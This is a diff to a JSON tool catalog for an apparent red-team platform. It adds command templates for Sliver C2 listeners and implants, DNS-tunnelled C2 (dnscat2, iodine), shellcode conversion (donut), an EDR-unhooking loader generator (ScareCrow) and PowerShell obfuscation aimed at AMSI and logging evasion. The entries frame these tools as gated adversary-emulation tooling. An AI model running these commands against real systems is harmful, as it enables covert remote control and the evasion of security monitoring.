@@ -52,7 +52,9 @@
     "<dorks-file>": "Path to a file of dork queries, one per line.",
     "<path>": "A URL path component, e.g. /admin.",
     "<payload>": "The command, script or implant to run when the persistence mechanism fires.",
-    "<name>": "A name/identifier for the object being created (task, service, registry value, unit, shortcut)."
+    "<name>": "A name/identifier for the object being created (task, service, registry value, unit, shortcut).",
+    "<tunnel-zone>": "A DNS zone the OPERATOR controls and has delegated to their own name server — the suffix a DNS tunnel encodes its traffic under. Deliberately not named <domain>: that spelling the composer's target substitution rewrites, and the tunnel's zone is yours, not the target's (same reason as <listener>).",
+    "<tunnel-net>": "The point-to-point address (optionally with a netmask) the OPERATOR assigns to a tunnel interface, e.g. an unused private /27. Not spelled with ip/host for the same reason as <listener>: the tunnel's own network is never the target's."
   },
   "tools": [
     {
@@ -3859,23 +3861,36 @@
     },
     {
       "name": "Sliver",
-      "category": "persistence",
-      "purpose": "Open-source C2 framework (Bishop Fox) whose implants support several persistence mechanisms. Reference-only in HackPit: NOT installed — its install and C2 wiring are deferred to build #4, so reconcile shows it not-present and the planner will not propose it.",
+      "category": "c2",
+      "purpose": "Cross-platform adversary-emulation C2 framework (Bishop Fox): mTLS, HTTP(S), DNS and WireGuard listeners with per-OS implants, plus post-exploitation and persistence modules. Human-driven in HackPit — starting a listener and every implant action is its own approved step through the gated executor. Its sandbox-image install and the cockpit Sliver panel land in later tasks of this build; until they do, reconcile shows it not-present and the planner will not propose it.",
       "phases": [
         "command-and-control",
         "post-exploitation"
       ],
       "techniques": [
         "C2",
-        "implant persistence",
-        "beaconing"
+        "adversary emulation",
+        "implant generation",
+        "beaconing",
+        "DNS C2",
+        "implant persistence"
       ],
       "docs": "https://github.com/BishopFox/sliver",
       "templates": [
         {
+          "label": "Start an mTLS listener (Sliver console)",
+          "template": "mtls --lport <listener-port>",
+          "note": "Operator-side listener, on your own host. Starting and stopping it is a human-driven, gated action — nothing in the catalog starts a listener."
+        },
+        {
           "label": "Generate an mTLS implant (Sliver console)",
           "template": "generate --mtls <listener> --save <output>",
-          "note": "Run inside the Sliver console. Reference-only — Sliver is not installed (deferred to build #4)."
+          "note": "Run inside the Sliver console. Produces an artifact on disk; delivering or running it is a separate, separately-approved step."
+        },
+        {
+          "label": "Generate a DNS implant (Sliver console)",
+          "template": "generate --dns <tunnel-zone> --save <output>",
+          "note": "Beacons over a DNS zone YOU control and have delegated — never the target's. Much louder in DNS telemetry than mTLS; see the detection footprint for what a defender sees."
         }
       ],
       "flags": []
@@ -3932,6 +3947,238 @@
         }
       ],
       "flags": []
+    },
+    {
+      "name": "dnscat2",
+      "aliases": [
+        "dnscat2-server",
+        "dnscat2-client"
+      ],
+      "category": "evasion",
+      "purpose": "Encrypted command-and-control tunnelled entirely over DNS (T1071.004). The client talks only to the host's configured resolver, so it reaches the operator's authoritative server through the target's own DNS infrastructure without opening a direct outbound socket — which is what makes it the test of whether egress filtering and DNS analytics catch a covert channel. Its sandbox-image install lands in a later task of this build.",
+      "phases": [
+        "command-and-control",
+        "post-exploitation"
+      ],
+      "techniques": [
+        "DNS tunneling",
+        "covert channel",
+        "C2",
+        "T1071.004"
+      ],
+      "docs": "https://github.com/iagox86/dnscat2",
+      "templates": [
+        {
+          "label": "Start the server (operator side)",
+          "template": "dnscat2-server <tunnel-zone>",
+          "note": "Runs on the authoritative name server for a zone YOU control and have had delegated — never the target's zone. Listener lifecycle is human-driven through the gated executor."
+        },
+        {
+          "label": "Connect a client from the compromised host",
+          "template": "dnscat2-client <tunnel-zone>",
+          "note": "Runs on a host you already have execution on, as its own approved step. Add `--dns server=<listener>` only to test direct-to-server mode instead of recursion through the target's resolver."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "--dns",
+          "what": "resolver/transport settings, e.g. server=, port=, domain="
+        },
+        {
+          "flag": "--secret",
+          "what": "pre-shared key authenticating the encrypted session"
+        },
+        {
+          "flag": "--no-cache",
+          "what": "disable the server-side response cache"
+        }
+      ]
+    },
+    {
+      "name": "iodine",
+      "aliases": [
+        "iodined"
+      ],
+      "category": "evasion",
+      "purpose": "IP-over-DNS tunnel (T1572): brings up a point-to-point interface whose packets ride inside DNS queries, so ordinary tooling can be routed through a network that permits nothing but DNS. Slower and far louder in DNS telemetry than a purpose-built C2 — catalogued to prove out egress controls, not to stay quiet. Its sandbox-image install lands in a later task of this build.",
+      "phases": [
+        "command-and-control",
+        "post-exploitation"
+      ],
+      "techniques": [
+        "DNS tunneling",
+        "IP over DNS",
+        "protocol tunneling",
+        "T1572"
+      ],
+      "docs": "https://github.com/yarrick/iodine",
+      "templates": [
+        {
+          "label": "Start the server (operator side)",
+          "template": "iodined -f -c -P <password> <tunnel-net> <tunnel-zone>",
+          "note": "Runs on the name server for a delegated zone YOU control. <tunnel-net> is the tunnel interface's own address/netmask and is unrelated to any engagement range."
+        },
+        {
+          "label": "Connect a client from the compromised host",
+          "template": "iodine -f -P <password> <tunnel-zone>",
+          "note": "Runs on the host you already have execution on. `-r` forces DNS-only mode when the faster raw-UDP path would succeed and it is the DNS path you want tested."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-f",
+          "what": "stay in the foreground"
+        },
+        {
+          "flag": "-P",
+          "what": "pre-shared password for the tunnel"
+        },
+        {
+          "flag": "-c",
+          "what": "server: skip the client-IP check"
+        },
+        {
+          "flag": "-r",
+          "what": "client: skip the raw-UDP probe, force DNS-only"
+        }
+      ]
+    },
+    {
+      "name": "donut",
+      "category": "evasion",
+      "purpose": "Converts a PE, .NET assembly, DLL or VBS/JS file into position-independent shellcode a loader can run from memory (T1620), so the payload never has to land on disk as an executable. Generation only: the output is a file until a human approves a separate step that runs it. Its sandbox-image install lands in a later task of this build.",
+      "phases": [
+        "exploitation",
+        "post-exploitation"
+      ],
+      "techniques": [
+        "shellcode generation",
+        "in-memory execution",
+        "reflective loading",
+        "T1620"
+      ],
+      "docs": "https://github.com/TheWover/donut",
+      "templates": [
+        {
+          "label": "PE / .NET assembly to shellcode",
+          "template": "donut -i <file> -o <output>",
+          "note": "Emits position-independent shellcode. Feeding it to a loader is its own approved step — donut itself only writes a file."
+        },
+        {
+          "label": "Shellcode for a specific architecture",
+          "template": "donut -i <file> -a 2 -o <output>",
+          "note": "-a 1 = x86, 2 = amd64, 3 = dual-mode. Match the host you will run on."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-i",
+          "what": "input PE / .NET assembly / DLL / VBS / JS"
+        },
+        {
+          "flag": "-o",
+          "what": "output shellcode file"
+        },
+        {
+          "flag": "-a",
+          "what": "architecture: 1 x86, 2 amd64, 3 both"
+        },
+        {
+          "flag": "-c",
+          "what": ".NET class name"
+        },
+        {
+          "flag": "-m",
+          "what": ".NET method name"
+        },
+        {
+          "flag": "-p",
+          "what": "parameters passed to the entry point"
+        }
+      ]
+    },
+    {
+      "name": "ScareCrow",
+      "category": "evasion",
+      "purpose": "Loader generator that wraps shellcode in a Windows artifact and restores clean copies of ntdll/kernel32 before running it, so userland API hooking sees nothing (T1620 / T1027.002). Cross-compiles from Linux. HackPit only GENERATES the artifact; delivering or running it is a separate, separately-approved step. Its sandbox-image install lands in a later task of this build.",
+      "phases": [
+        "exploitation",
+        "post-exploitation"
+      ],
+      "techniques": [
+        "loader generation",
+        "EDR unhooking",
+        "software packing",
+        "T1027.002",
+        "T1620"
+      ],
+      "docs": "https://github.com/optiv/ScareCrow",
+      "templates": [
+        {
+          "label": "Loader from raw shellcode",
+          "template": "ScareCrow -I <file> -Loader binary",
+          "note": "-I takes raw shellcode (donut output, for instance). -Loader picks the artifact type: binary, dll, cpl, xll, msiexec, control, js, hta, wscript. The result is a file on disk, nothing more."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-I",
+          "what": "raw shellcode input file"
+        },
+        {
+          "flag": "-Loader",
+          "what": "artifact type: binary, dll, cpl, xll, msiexec, ..."
+        },
+        {
+          "flag": "-domain",
+          "what": "domain whose code-signing identity the artifact spoofs"
+        },
+        {
+          "flag": "-O",
+          "what": "output artifact name"
+        }
+      ]
+    },
+    {
+      "name": "Invoke-Obfuscation",
+      "platform": "windows",
+      "category": "evasion",
+      "purpose": "PowerShell obfuscation framework (T1027.010) — token, string, encoding and launcher-level rewrites of a script or command, used to test whether script-block logging, AMSI and signature-based detection still fire once a payload is transformed. Windows/PowerShell host only: it cannot run on the Linux sandbox, and is catalogued so HackPit can help PLAN and WRITE UP that work rather than implying it is runnable here.",
+      "phases": [
+        "post-exploitation"
+      ],
+      "techniques": [
+        "PowerShell obfuscation",
+        "command obfuscation",
+        "AMSI/logging evasion",
+        "T1027.010"
+      ],
+      "docs": "https://github.com/danielbohannon/Invoke-Obfuscation",
+      "templates": [
+        {
+          "label": "Obfuscate a script non-interactively",
+          "template": "Invoke-Obfuscation -ScriptPath <file> -Command \"Token\\All\\1\" -Quiet",
+          "note": "Runs on a Windows PowerShell host — deliberately NOT installed in the Linux image. -Command replays the interactive menu path; Token\\All\\1 applies every token-level transform."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-ScriptPath",
+          "what": "the .ps1 to obfuscate (-ScriptBlock for inline code)"
+        },
+        {
+          "flag": "-Command",
+          "what": "menu path to replay non-interactively"
+        },
+        {
+          "flag": "-Quiet",
+          "what": "suppress the banner and menu output"
+        },
+        {
+          "flag": "-NoExit",
+          "what": "stay in the console after the command runs"
+        }
+      ]
     }
   ]
 }
